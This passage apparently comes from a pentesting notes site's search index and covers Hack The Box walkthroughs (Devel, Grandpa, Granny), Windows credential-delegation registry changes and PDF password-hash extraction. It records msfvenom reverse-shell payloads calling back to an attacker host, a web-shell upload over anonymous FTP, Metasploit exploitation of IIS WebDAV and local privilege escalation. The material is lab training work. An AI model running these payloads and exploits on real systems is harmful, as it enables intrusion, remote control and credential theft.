spotless:\nGet-NetGPO -UserIdentity spotless  and then parse the policy file:\nParse-PolFile -Path \u0026quot;\\\\offense.local\\sysvol\\offense.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol\u0026quot;  Enabling Credential Delegation If you have admin rights on the compromised box, you can enable all credential delegation like so:\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials /v 1 /t REG_SZ /d \u0026quot;*\u0026quot; reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1 reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d \u0026quot;*\u0026quot; ## delete all reg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /f  References clement.notin.org\nGPRegistryPolicyParser\nsource\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/devel/",
	"title": "Devel",
	"tags": ["HTB"],
	"description": "Notes from the Devel machine on HTB.",
	"content": "devel where you at 10.10.10.5\nwhat you got nmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (2 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    # Nmap 7.80 scan initiated Thu Jan 23 19:06:09 2020 as: nmap -oX - -A -T4 -oN /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.gnmap 10.10.10.5 Nmap scan report for 10.10.10.5 Host is up (0.019s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 04:37PM 689 iisstart.htm |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: phone|general purpose|specialized Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%) OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 18.68 ms 10.10.14.1 2 18.83 ms 10.10.10.5 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jan 23 19:06:25 2020 -- 1 IP address (1 host up) scanned in 16.36 seconds  Port 21 FTP anon on webroot\n| ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 04:37PM 689 iisstart.htm |_03-17-17 04:37PM 184946 welcome.png  port 80   Related files   gobuster_dir_med-txt-html.txt  (0 kb)   nikto.txt  (0 kb)    - Nikto v2.1.6/2.1.5 + Target Host: 10.10.10.5 + Target Port: 80 + GET Retrieved x-powered-by header: ASP.NET + GET The anti-clickjacking X-Frame-Options header is not present. + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + GET Retrieved x-aspnet-version header: 2.0.50727 + OPTIONS Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + OPTIONS Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + GET /: Appears to be a default IIS 7 install.  Exploit   Related files   r_s.asp  (0 kb)   r_s.aspx  (2 kb)   shell.aspx  (2 kb)    msfvenom -p windows/meterpreter/reverse_tcp -f asp \u0026gt; r_s.asp LHOST=10.10.14.23 LPORT=4444 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of asp file: 38493 bytes pftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; put r_s.asp local: r_s.asp remote: r_s.asp 227 Entering Passive Mode (10,10,10,5,192,13). 150 Opening ASCII mode data connection. 226 Transfer complete. 38563 bytes sent in 0.02 secs (1.8918 MB/s) ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,5,192,14). 150 Opening ASCII mode data connection. 03-18-17 01:06AM \u0026lt;DIR\u0026gt; aspnet_client 03-17-17 04:37PM 689 iisstart.htm 01-27-20 04:43AM 38563 r_s.asp 01-27-20 04:40AM 2763 shell.aspx 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 10.10.14.23 set lport 4444 set ExitOnSession false exploit -j curl http://10.10.10.5/r_s.asp \u0026lt;!DOCTYPE html PUBLIC \u0026quot;-//W3C//DTD XHTML 1.0 Strict//EN\u0026quot; \u0026quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\u0026quot;\u0026gt; \u0026lt;html xmlns=\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=iso-8859-1\u0026quot;/\u0026gt; \u0026lt;title\u0026gt;500 - Internal server error.\u0026lt;/title\u0026gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 --platform windows -f aspx \u0026gt; r_s.aspx [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of aspx file: 2822 bytes ftp\u0026gt; put r_s.aspx local: r_s.aspx remote: r_s.aspx 227 Entering Passive Mode (10,10,10,5,192,19). 150 Opening ASCII mode data connection. 226 Transfer complete. 2858 bytes sent in 0.00 secs (6.9708 MB/s) ftp\u0026gt; curl http://10.10.10.5/r_s.aspx msf5 exploit(multi/handler) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.14.23:4444 -\u0026gt; 10.10.10.5:49172) at 2020-01-23 19:59:50 +0100 meterpreter \u0026gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 0 Meterpreter : x86/windows meterpreter \u0026gt; shell whoami Process 1412 created. Channel 1 created. Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt;whoami iis apppool\\web  post exploit meterpreter \u0026gt; getsystem [-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted: [-] Named Pipe Impersonation (In Memory/Admin) [-] Named Pipe Impersonation (Dropper/Admin) [-] Token Duplication (In Memory/Admin) meterpreter \u0026gt; cd C:\\\\Users\\\\ meterpreter \u0026gt; ls Listing: C:\\Users ================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 8192 dir 2017-03-18 00:16:43 +0100 Administrator 40777/rwxrwxrwx 0 dir 2009-07-14 06:53:55 +0200 All Users 40777/rwxrwxrwx 8192 dir 2017-03-18 00:06:26 +0100 Classic .NET AppPool 40555/r-xr-xr-x 8192 dir 2009-07-14 04:37:05 +0200 Default 40777/rwxrwxrwx 0 dir 2009-07-14 06:53:55 +0200 Default User 40555/r-xr-xr-x 4096 dir 2009-07-14 04:37:05 +0200 Public 40777/rwxrwxrwx 8192 dir 2017-03-17 15:17:37 +0100 babis 100666/rw-rw-rw- 174 fil 2009-07-14 06:41:57 +0200 desktop.ini C:\\Users\u0026gt;netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:21 0.0.0.0:0 LISTENING 1420 TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 672 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING 384 TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING 724 TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING 888 TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING 488 TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING 496 TCP 10.10.10.5:21 10.10.16.109:41896 ESTABLISHED 1420 TCP 10.10.10.5:80 10.10.14.23:40728 ESTABLISHED 4 TCP 10.10.10.5:139 0.0.0.0:0 LISTENING 4 TCP 10.10.10.5:49175 10.10.14.23:4444 ESTABLISHED 3972 TCP [::]:21 [::]:0 LISTENING 1420 TCP [::]:80 [::]:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 672 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5357 [::]:0 LISTENING 4 TCP [::]:49152 [::]:0 LISTENING 384 TCP [::]:49153 [::]:0 LISTENING 724 TCP [::]:49154 [::]:0 LISTENING 888 TCP [::]:49155 [::]:0 LISTENING 488 TCP [::]:49156 [::]:0 LISTENING 496 UDP 0.0.0.0:123 *:* 1000 UDP 0.0.0.0:3702 *:* 1384 UDP 0.0.0.0:3702 *:* 1384 UDP 0.0.0.0:5355 *:* 1092 UDP 0.0.0.0:61429 *:* 1384 UDP 10.10.10.5:137 *:* 4 UDP 10.10.10.5:138 *:* 4 UDP [::]:123 *:* 1000 UDP [::]:3702 *:* 1384 UDP [::]:3702 *:* 1384 UDP [::]:61430 *:* 1384 meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 264 4 smss.exe 308 488 dllhost.exe 344 336 csrss.exe 384 336 wininit.exe 396 376 csrss.exe 452 376 winlogon.exe 488 384 services.exe 496 384 lsass.exe 504 384 lsm.exe 608 488 svchost.exe 672 488 svchost.exe 724 488 svchost.exe 796 452 LogonUI.exe 848 488 svchost.exe 888 488 svchost.exe 1000 488 svchost.exe 1092 488 svchost.exe 1180 488 spoolsv.exe 1216 488 svchost.exe 1316 488 svchost.exe 1384 488 svchost.exe 1420 488 svchost.exe 1508 488 VGAuthService.exe 1536 488 vmtoolsd.exe 1568 488 svchost.exe 1628 488 msdtc.exe 1700 488 powercfg.exe 2028 608 WmiPrvSE.exe 2652 488 sppsvc.exe 2684 488 svchost.exe 2792 488 SearchIndexer.exe 3148 488 svchost.exe 3772 344 conhost.exe 3972 1568 w3wp.exe x86 0 IIS APPPOOL\\Web c:\\windows\\system32\\inetsrv\\w3wp.exe C:\\\u0026gt;wmic qfe get Caption,Description,HotFixID,InstalledOn wmic qfe get Caption,Description,HotFixID,InstalledOn No Instance(s) Available. msf5 post(multi/recon/local_exploit_suggester) \u0026gt; set session 4 session =\u0026gt; 4 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 29 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/todo-hacking-methodology/04-post-exploitation/pdf/encrypted-password-protected-pdf/",
	"title": "encrypted password protected pdf",
	"tags": ["Post Exploitation"],
	"description": "encrypted password protected pdf description.",
	"content": "encrypted password protected pdf source\npdfid check if pdf is encrypted (/Encrypt)\nroot@kali:/mnt/hgfs/_shared_folder# pdfid -n \u0026quot;0ld is g0ld.pdf\u0026quot; PDFiD 0.2.7 0ld is g0ld.pdf PDF Header: %PDF-1.6 obj 15 endobj 15 stream 5 endstream 5 xref 2 trailer 2 startxref 2 /Page 1 /Encrypt 2 /ObjStm 1  pdf-parser Where is /Encrypt (object 43)\nroot@kali:/mnt/hgfs/_shared_folder# pdf-parser -s /Encrypt \u0026quot;0ld is g0ld.pdf\u0026quot; trailer \u0026lt;\u0026lt; /Size 45 /Root 1 0 R /Info 10 0 R /ID [\u0026lt;5C8F37D2A45EB64E9DBBF71CA3E86861\u0026gt;\u0026lt;5C8F37D2A45EB64E9DBBF71CA3E86861\u0026gt;] /Encrypt 43 0 R \u0026gt;\u0026gt; trailer \u0026lt;\u0026lt; /Size 45 /Root 1 0 R /Info 10 0 R /ID [\u0026lt;5C8F37D2A45EB64E9DBBF71CA3E86861\u0026gt;\u0026lt;5C8F37D2A45EB64E9DBBF71CA3E86861\u0026gt;] /Encrypt 43 0 R /Prev 196676 /XRefStm 196344 \u0026gt;\u0026gt;  show object 43\nroot@kali:/mnt/hgfs/_shared_folder# pdf-parser -o 43 \u0026quot;0ld is g0ld.pdf\u0026quot; obj 43 0 Type: Referencing: \u0026lt;\u0026lt; /CF \u0026lt;\u0026lt; /StdCF \u0026lt;\u0026lt; /AuthEvent /DocOpen /CFM /AESV2 /Length 16 \u0026gt;\u0026gt; \u0026gt;\u0026gt; /Filter /Standard /Length 128 /O \u0026lt;702CC7CED92B595274B7918DCB6DC74BEDEF6EF851B4B4B5B8C88732BA4DAC0C\u0026gt; /P -1060 /R 4 /StmF /StdCF /StrF /StdCF /U \u0026lt;9CBA5CFB1C536F1384BBA7458AAE3F8100000000000000000000000000000000\u0026gt; /V 4 \u0026gt;\u0026gt;  Uses RC4 128-bit /Filter /Standard /Length 128\nqpdf check if its a user or system password.\nroot@kali:/mnt/hgfs/_shared_folder# qpdf --show-encryption \u0026quot;0ld is g0ld.pdf\u0026quot; 0ld is g0ld.pdf: invalid password  pdf2john Get password hash from pdf\nroot@kali:/mnt/hgfs/_shared_folder# /usr/share/john/pdf2john.pl \u0026quot;0ld is g0ld.pdf\u0026quot; 0ld is g0ld.pdf:$pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c  hashcat format hashcat just needs the hash, not the pdf name.\nroot@kali:/mnt/hgfs/_shared_folder# /usr/share/john/pdf2john.pl \u0026quot;0ld is g0ld.pdf\u0026quot; | cut -d : -f 2 $pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c  see hashcat for examplesto crack\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/graficom-spoorzoeker/",
	"title": "Graficom Spoorzoeker",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/grandpa/",
	"title": "Grandpa",
	"tags": ["HTB"],
	"description": "Notes from the Grandpa machine on HTB.",
	"content": "grandpa where you at 10.10.10.14\nnmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (2 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    Gobuster   Related files   gobuster_dir_med-txt-html.txt  (0 kb)    Nikto   Related files   nikto.txt  (2 kb)    what you got IIS 6.0 + Webdav\nmsf5 \u0026gt; search ScStoragePathFromUrl Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/iis/iis_webdav_scstoragepathfromurl 2017-03-26 manual Yes Microsoft IIS WebDav ScStoragePathFromUrl Overflow msf5 \u0026gt; use 0 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set RHOST 10.10.10.14 RHOST =\u0026gt; 10.10.10.14 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.14 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.24:4444 [*] Trying path length 3 to 60 ... [*] Sending stage (180291 bytes) to 10.10.10.14 [*] Meterpreter session 1 opened (10.10.14.24:4444 -\u0026gt; 10.10.10.14:1033) at 2020-01-25 14:17:32 +0100 meterpreter \u0026gt; sysinfo Computer : GRANPA OS : Windows .NET Server (5.2 Build 3790, Service Pack 2). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 2 Meterpreter : x86/windows meterpreter \u0026gt; shell [-] Failed to spawn shell with thread impersonation. Retrying without it. Process 3428 created. Channel 2 created. Microsoft Windows [Version 5.2.3790] (C) Copyright 1985-2003 Microsoft Corp. c:\\windows\\system32\\inetsrv\u0026gt;whoami whoami nt authority\\network service C:\\\u0026gt;systeminfo systeminfo Host Name: GRANPA OS Name: Microsoft(R) Windows(R) Server 2003, Standard Edition OS Version: 5.2.3790 Service Pack 2 Build 3790 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Uniprocessor Free Registered Owner: HTB Registered Organization: HTB Product ID: 69712-296-0024942-44782 Original Install Date: 4/12/2017, 5:07:40 PM System Up Time: 0 Days, 13 Hours, 8 Minutes, 37 Seconds System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: X86-based PC Processor(s): 1 Processor(s) Installed. [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz BIOS Version: INTEL - 6040000 Windows Directory: C:\\WINDOWS System Directory: C:\\WINDOWS\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (GMT+02:00) Athens, Beirut, Istanbul, Minsk Total Physical Memory: 1,023 MB Available Physical Memory: 793 MB Page File: Max Size: 2,470 MB Page File: Available: 2,323 MB Page File: In Use: 147 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A  root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Grandpa/scans# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py -i systeminfo.txt -d /opt/Windows-Exploit-Suggester/2020-01-24-mssb.xls \u0026gt;\u0026gt; wes.txt  msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; search ms15-051 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/local/ms15_051_client_copy_image 2015-05-12 normal Yes Windows ClientCopyImage Win32k Exploit [*] Started reverse TCP handler on 192.168.136.165:4444 [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied. [*] Exploit completed, but no session was created.  meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 324 272 csrss.exe 348 272 winlogon.exe 396 348 services.exe 408 348 lsass.exe 588 396 svchost.exe 680 396 svchost.exe 736 396 svchost.exe 764 396 svchost.exe 800 396 svchost.exe 936 396 spoolsv.exe 964 396 msdtc.exe 1076 396 cisvc.exe 1116 396 svchost.exe 1176 396 inetinfo.exe 1216 396 svchost.exe 1328 396 VGAuthService.exe 1408 396 vmtoolsd.exe 1456 396 svchost.exe 1596 396 svchost.exe 1708 396 alg.exe 1836 588 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 1912 396 dllhost.exe 2300 588 wmiprvse.exe 3048 1456 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe 3120 588 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 3168 3048 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe 3220 800 wmiadap.exe meterpreter \u0026gt; migrate 1836 [*] Migrating from 3168 to 1836... [*] Migration completed successfully.  msf5 exploit(windows/local/ms15_051_client_copy_image) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.24:4445 [*] Launching notepad to host the exploit... [+] Process 3856 launched. [*] Reflectively injecting the exploit DLL into 3856... [*] Injecting exploit into 3856... [*] Exploit injected. Injecting payload into 3856... [*] Payload injected. Executing exploit... [*] Sending stage (180291 bytes) to 10.10.10.14 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Meterpreter session 3 opened (10.10.14.24:4445 -\u0026gt; 10.10.10.14:1032) at 2020-01-25 14:49:47 +0100 meterpreter \u0026gt;  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/granny/",
	"title": "Granny",
	"tags": ["HTB"],
	"description": "Notes from the Granny machine on HTB.",
	"content": "granny where you at 10.10.10.15\nnmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (2 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    Gobuster   Related files   gobuster_dir_med-txt-html.txt  (0 kb)    Nikto   Related files   nikto.txt  (2 kb)    what you got IIS 6.0 + Webdav\nmsf5 \u0026gt; search ScStoragePathFromUrl Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/iis/iis_webdav_scstoragepathfromurl 2017-03-26 manual Yes Microsoft IIS WebDav ScStoragePathFromUrl Overflow msf5 \u0026gt; use 0 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf5 exploit(/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; set RHOST 10.10.10.15 RHOST =\u0026gt; 10.10.10.15 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; show options Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl): Name Current Setting Required Description ---- --------------- -------- ----------- MAXPATHLENGTH 60 yes End of physical path brute force MINPATHLENGTH 3 yes Start of physical path brute force Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.15 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path of IIS 6 web application VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 Microsoft Windows Server 2003 R2 SP2 x86 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; run [8/97] [*] Started reverse TCP handler on 10.10.14.24:4445 [*] Trying path length 3 to 60 ... [*] Sending stage (180291 bytes) to 10.10.10.15 [*] Meterpreter session 1 opened (10.10.14.24:4445 -\u0026gt; 10.10.10.15:1030) at 2020-01-25 15:24:42 +0100 meterpreter \u0026gt; getuid [-] stdapi_sys_config_getuid: Operation failed: Access is denied. meterpreter \u0026gt; sysinfo Computer : GRANNY OS : Windows .NET Server (5.2 Build 3790, Service Pack 2). Architecture : x86 System Language : en_US Domain : HTB Logged On Users : 2 Meterpreter : x86/windows meterpreter \u0026gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System 272 4 smss.exe 324 272 csrss.exe 348 272 winlogon.exe 396 348 services.exe 408 348 lsass.exe 588 396 svchost.exe 680 396 svchost.exe 736 396 svchost.exe 764 396 svchost.exe 800 396 svchost.exe 936 396 spoolsv.exe 964 396 msdtc.exe 1084 396 cisvc.exe 1132 396 svchost.exe 1180 396 inetinfo.exe 1216 396 svchost.exe 1332 396 VGAuthService.exe 1412 396 vmtoolsd.exe 1460 396 svchost.exe 1600 396 svchost.exe 1704 396 alg.exe 1828 588 wmiprvse.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe 1908 396 dllhost.exe 2380 588 wmiprvse.exe 3040 588 davcdata.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe 3092 2060 rundll32.exe x86 0 C:\\WINDOWS\\system32\\rundll32.exe 3164 1460 w3wp.exe x86 0 NT AUTHORITY\\NETWORK SERVICE c:\\windows\\system32\\inetsrv\\w3wp.exe meterpreter \u0026gt; getpid Current pid: 3092 meterpreter \u0026gt; migrate 3164 [*] Migrating from 3092 to 3164... [*] Migration completed successfully. meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\NETWORK SERVICE msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; search suggest Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/server/icmp_exfil normal No ICMP Exfiltration Service 1 exploit/windows/browser/ms10_018_ie_behaviors 2010-03-09 good No MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free 2 exploit/windows/smb/timbuktu_plughntcommand_bof 2009-06-25 great No Timbuktu PlughNTCommand Named Pipe Buffer Overflow 3 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester 4 post/osx/gather/enum_colloquy normal No OS X Gather Colloquy Enumeration 5 post/osx/manage/sonic_pi normal No OS X Manage Sonic Pi msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) \u0026gt; use 3 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.10.10.15 - Collecting local exploits for x86/windows... [*] 10.10.10.15 - 29 exploit checks are being tried... [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.15 - 